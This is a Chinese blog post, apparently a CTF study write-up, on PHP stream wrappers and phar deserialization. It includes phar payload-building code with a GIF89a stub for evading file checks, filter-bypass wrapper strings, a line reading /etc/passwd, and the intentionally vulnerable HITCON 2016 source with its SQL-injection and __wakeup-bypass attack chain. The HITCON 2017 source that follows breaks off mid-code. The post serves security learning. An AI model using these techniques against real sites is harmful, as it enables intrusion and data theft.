        <content type="html"><![CDATA[<h1 id="PHP-stream-wrapper机制相关题目的分析整理"><a href="#PHP-stream-wrapper机制相关题目的分析整理" class="headerlink" title="PHP stream wrapper机制相关题目的分析整理"></a>PHP stream wrapper机制相关题目的分析整理</h1><h2 id="一、流和包装器简介"><a href="#一、流和包装器简介" class="headerlink" title="一、流和包装器简介"></a>一、流和包装器简介</h2><p>**流(stream)**是在PHP 4.3.0中引入的，作为一种通用文件、网络、数据压缩和其他操作的方式，这些操作共享一组共同的函数和用途。在其最简单的定义中，流是一种表现出流行为的资源对象。</p><p>每一种流都实现了一个**包装器(wrapper)**，包装器包含一些额外的代码用来处理特殊的协议和编码。PHP提供了一些内置的包装器。</p><p>引用流的格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scheme&gt;://&lt;target&gt;</span><br></pre></td></tr></table></figure><ul><li>其中，<code>&lt;schema&gt;</code>为包装器的名称，如file，http，https，ftp，compress.zlib，php等。可以用<code>stream_get_wrappers()</code>函数查看内置的所有包装器。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">array(10) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;https&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(4) &quot;ftps&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(13) &quot;compress.zlib&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(4) &quot;glob&quot;</span><br><span class="line">  [6]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [7]=&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [8]=&gt;</span><br><span class="line">  string(3) &quot;ftp&quot;</span><br><span class="line">  [9]=&gt;</span><br><span class="line">  string(4) &quot;phar&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;target&gt;</code>取决于所使用的包装器。如对于文件系统相关的流<code>&lt;target&gt;</code>通常是所需文件的文件路径和文件名；对于网络相关的流，<code>&lt;target&gt;</code>通常是目标的主机名和路径。</li></ul><p>例如，可以使用file_get_contents()打开多种数据流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(file_get_contents(&#x27;/etc/passwd&#x27;));</span><br><span class="line">//打开本地文件</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(&#x27;http://www.baidu.com&#x27;));</span><br><span class="line">//访问网络页面</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(&#x27;data:test/plain,coooool!&#x27;));</span><br><span class="line">//打开data url</span><br></pre></td></tr></table></figure><h2 id="二、Phar反序列化"><a href="#二、Phar反序列化" class="headerlink" title="二、Phar反序列化"></a>二、Phar反序列化</h2><p>在2018年的Black Hat大会上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，指出通过<code>phar://</code>协议对一个phar文件进行操作，可能导致触发反序列化漏洞。</p><p>PHAR(PHp ARchive)是php中的打包文件，类似于java语言的jar打包文件。</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20210131160058.png" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20210131160058.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>可以看到倒数第二行，Meta-data以序列化格式存储。因此php的文件系统函数在通过<code>phar://</code>协议解析phar时，也需要对meta-data进行反序列化。因此可能触发反序列化漏洞。</p><p>受影响函数列表：</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20181022191840154020712093196.webp" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20181022191840154020712093196.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h4 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h4><ul><li>绕过文件格式的匹配：在文件头加上<code>GIF89a</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub开头为GIF89a</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><ul><li><p>编码绕过、大小写绕过等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;PhAr://&quot;</span> . <span class="keyword">__DIR__</span> . <span class="string">&#x27;/phar.phar&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;\x70har\x3a//&quot;</span> . <span class="keyword">__DIR__</span> . <span class="string">&#x27;/phar.phar&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://&#x27;</span> . <span class="keyword">__DIR__</span> . <span class="string">&#x27;/phar.phar&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li></li></ul><h2 id="三、题目"><a href="#三、题目" class="headerlink" title="三、题目"></a>三、题目</h2><h3 id="（1）HITCON-2016-babytrick"><a href="#（1）HITCON-2016-babytrick" class="headerlink" title="（1）HITCON 2016 babytrick"></a>（1）HITCON 2016 babytrick</h3><p><del>这个似乎与stream或wrapper无关，只是顺带</del></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>) = func_get_args();</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die( sprintf(<span class="string">&quot;%s is %s&quot;</span>, <span class="variable">$obj</span>-&gt;username, <span class="variable">$obj</span>-&gt;role) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Nobody Nobody But You!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = func_get_args();</span><br><span class="line">        <span class="variable">$username</span> = strtolower(trim(mysql_escape_string(<span class="variable">$username</span>)));</span><br><span class="line">        <span class="variable">$password</span> = strtolower(trim(mysql_escape_string(<span class="variable">$password</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$username</span> == <span class="string">&#x27;orange&#x27;</span> || stripos(<span class="variable">$sql</span>, <span class="string">&#x27;orange&#x27;</span>) != <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$obj</span>-&gt;role == <span class="string">&#x27;admin&#x27;</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Hi, Orange! Here is your flag: &quot;</span> . <span class="variable">$FLAG</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db_host</span>, <span class="variable">$db_name</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>, <span class="variable">$DEBUG</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>);</span><br><span class="line">        mysql_select_db(<span class="variable">$db_name</span>, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$DEBUG</span>) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users ( </span></span><br><span class="line"><span class="string">                        username VARCHAR(64), </span></span><br><span class="line"><span class="string">                        password VARCHAR(64), </span></span><br><span class="line"><span class="string">                        role VARCHAR(64)</span></span><br><span class="line"><span class="string">                    ) CHARACTER SET utf8&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        mysql_query(<span class="string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        mysql_query(<span class="string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = @mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$back</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line"></span><br><span class="line">        header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt; <span class="variable">$msg</span>) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;show&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;source&quot;</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = strtolower(trim(mysql_escape_string(<span class="variable">$v</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>])) &#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">&quot;source&quot;</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一道正常的反序列化题目，只有一个HITCON。观察代码可以发现，析构函数会将类的属性args作为参数，执行以属性method为名的方法。而在<code>login()</code>中可以找到输出flag。所以关键在于，<strong>登陆时需要以orange账号登录</strong>。</p><p>然而orange账号的密码是未知的。这里会注意到show()方法。可以利用<code>show()</code>方法在SQL查询时进行SQL注入，查询到账户orange的密码。仅需绕过<code>__wakeup()</code>魔术方法。利用<code>CVE-2016-7124</code>，序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过<code>__wakeup()</code>的执行，从而使传入的args参数无需经过<code>mysql_escape_string()</code>函数，直接地在<code>login()</code>方法中实现SQL注入。爆出密码。</p><p>获得密码后即可用于login()，但是这里仍有限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( $username == &#x27;orange&#x27; || stripos($sql, &#x27;orange&#x27;) != false ) &#123;</span><br><span class="line">   $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户名不能为’orange’，sql语句中不能包含’orange’。</p><p>以下内容来自MySql手册：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用utf8_general_ci和utf8_unicode_ci两种 校对规则下面的比较相等：</span><br><span class="line">     Ä = A</span><br><span class="line">     Ö = O</span><br><span class="line">     Ü = U</span><br><span class="line"></span><br><span class="line">两种校对规则之间的区别是，对于utf8_general_ci下面的等式成立：</span><br><span class="line">     ß = s</span><br><span class="line"></span><br><span class="line">但是，对于utf8_unicode_ci下面等式成立：</span><br><span class="line">     ß = ss</span><br></pre></td></tr></table></figure><p>因此，username=<code>ORÄNGE</code>时，可以绕过上面的php检测，而sql语句却依然能正常执行。orange账号成功登录，即可得到flag。</p><h3 id="（2）HITCON-2017"><a href="#（2）HITCON-2017" class="headerlink" title="（2）HITCON 2017"></a>（2）HITCON 2017</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$FLAG</span>    = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br><span class="line">    <span class="variable">$SECRET</span>  = `/read_secret`;</span><br><span class="line">    <span class="variable">$SANDBOX</span> = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @mkdir(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    @chdir(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$SANDBOX</span>));</span><br><span class="line">        <span class="variable">$hmac</span> = hash_hmac(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = explode(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !is_string(<span class="variable">$data</span>) || !is_string(<span class="variable">$hmac</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents(<span class="variable">$path</span> . <span 